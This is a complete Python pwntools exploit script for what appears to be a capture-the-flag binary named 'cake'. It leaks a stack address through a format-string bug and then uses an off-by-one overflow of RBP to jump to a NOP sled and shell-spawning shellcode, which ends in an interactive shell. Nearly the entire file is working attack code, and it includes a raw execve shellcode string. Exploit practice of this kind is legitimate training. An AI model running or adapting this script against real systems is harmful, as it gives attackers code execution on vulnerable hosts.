from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
break *0x40089b
break *0x400a31
continue
'''.format(**locals())

# Binary filename
exe = './cake'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# https://nixhacker.com/exploiting-off-by-one-buffer-overflow

# Lib-C library, can use pwninit/patchelf to patch binary
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

# Start program
io = start()

offset = 256  # 256 bytes, then we write 'A' to go to our shellcode (0x7fffffffde50)

# Build shellcode (cat flag.txt or spawn shell)
shellcode = asm(shellcraft.sh())  # Shellcraft
# shellcode = '\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'  # Shellstorm

# We want to find location of buffer first
io.sendlineafter(b'>', b'1')  # Eat Cake
io.sendlineafter(b':', b'1')  # 1 slice

io.sendlineafter(b'>', b'2')  # Give suggestion
io.sendlineafter(b'?', b'%8$p')  # Leak 8th item off stack (our buffer)

io.sendlineafter(b'>', b'3')  # View suggestion
stack_addr = int(re.search(r"(0x[\w\d]+)", io.recvlineS()).group(0), 16)  # Leaked buffer address
info("leaked stack_addr: %#x", stack_addr)
info("Sub 0x70: %#x", stack_addr - 0x70)

# Build the payload to write shellcode
payload = flat([
    b'3',  # 3 slices
    asm('nop') * 183,  # NOP sled
    stack_addr - 0x70,  # Address of our NOPs/shellcode
    asm('nop') * (offset - len(shellcode) - 184 - 8),  # NOP sled
    shellcode,  # Shellcode (sh/cat etc)
    p8(int(hex(stack_addr - 0x90)[-2:], 16))  # Control last byte of RBP (off-by-one)
])  # Payload length = 257

io.sendlineafter(b'>', b'1')  # Eat Cake
io.sendlineafter(b':', payload)  # Exploit

# Got Shell?
io.interactive()
